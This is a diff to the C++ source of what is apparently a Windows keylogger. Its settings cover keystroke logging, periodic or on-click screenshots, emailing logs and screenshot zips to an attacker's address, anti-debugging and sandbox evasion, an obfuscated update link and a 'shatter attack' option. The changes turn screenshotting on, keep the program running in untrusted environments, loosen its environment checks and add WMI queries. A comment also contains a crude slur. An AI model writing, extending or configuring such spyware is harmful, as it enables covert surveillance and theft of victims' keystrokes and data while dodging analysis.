@@ -30,6 +30,8 @@
 #include <lm.h>
 #include <psapi.h>
 #include <thread>
+#include <Wbemidl.h>
+
 
 
 #include "Antidbg.h"
@@ -46,7 +48,7 @@ using buffer = std::vector<char>;
 
 //[ VERSION INFO ]
 #define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "2.1"//current version number
+#define CurrentVersion "2.2"//current version number
 #define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
 
 //[ LOGS ]
@@ -55,24 +57,24 @@ using buffer = std::vector<char>;
 #define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
 #define LogTimer 15         //minutes per log                                [ must use mode 2 ]
 #define CharactersPerLog 400//how many characters should be in a log         [ must use mode 1 ]
-#define QuitIfUntrust true  //should we send a log if the environment is untrusted or quit on the spot?
+#define QuitIfUntrust false  //should we send a log if the environment is untrusted or quit on the spot?
 
 //[ SCREENGRABBING ]
-#define ScreenGrab false     //whether to screenshot at set intervals or not
+#define ScreenGrab true     //whether to screenshot at set intervals or not
 #define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
 #define SecondsBetweenScreenshots 20        //only works when using the timer
 #define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
 
 //[ EMAIL ]
 #define SendersEmail ""
-#define SendersPsw ""             //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
+#define SendersPsw ""								 //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
 #define RecieversEmail ""
 
 //[ ANTI-* ]
 #define ShatterAttack false //wether to shatter attack sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE!
 #define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
 #define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
-#define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
+#define SecurityLevel 2     //0-3 levels of trust towards environment        (anti-dbg feature)
 #define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
 #define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
 #define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
@@ -99,7 +101,7 @@ using buffer = std::vector<char>;
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "Slwga.lib")
 #pragma comment( lib, "comsuppw.lib" )
-//#pragma comment(lib, "Wbemuuid.lib.")
+#pragma comment(lib, "Wbemuuid.lib.")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "Netapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
@@ -127,7 +129,8 @@ int Hooker(int HookType, HOOKPROC CallbackFunc);
 void TimerThread();
 std::string RetrieveExternalIp(std::string CurrentDir);
 BOOL IsElevated();
-
+std::string QueryWMI(bstr_t Table, const wchar_t* Item, int Type);
+void FirstSetup();
 
 typedef std::string String;
 typedef std::vector<String> StringVector;
